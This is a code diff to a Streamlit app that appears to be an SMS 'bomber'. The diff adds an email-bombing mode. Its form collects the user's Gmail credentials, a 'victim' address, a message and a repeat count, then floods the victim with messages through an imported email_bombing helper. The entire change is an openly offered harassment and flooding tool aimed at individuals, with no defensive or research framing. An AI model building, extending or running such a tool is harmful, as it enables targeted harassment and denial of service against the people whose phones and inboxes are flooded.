@@ -1,5 +1,6 @@
 import streamlit as st
 from smshelper import get_phone_info, selectnode
+from emailhelper import email_bombing
 
 max_limit = {"sms": 1000, "call": 15, "mail": 200}
 
@@ -29,3 +30,17 @@ if user_bomber_select == bomber_options[0]:
             result = selectnode(str(country_code), str(phone_number), sms_count, delay, threads)
             st.success(result["status"])
             st.json(result)
+
+
+
+elif user_bomber_select == bomber_options[1]:
+
+    email = st.text_input("Enter Your Gmail Id: ")
+    password = st.text_input("Enter your Gmail App Password: ")
+    victime_email = st.text_input("Enter Your Victime Gmail Id: ")
+    message = st.text_area("Enter your Message:")
+    message_relode = st.number_input("How many message you want to send to an individual: ", step=1)
+
+    if st.button("Bombard"):
+        result = email_bombing(victime_email, email, password, message, message_relode)
+        st.success(result)
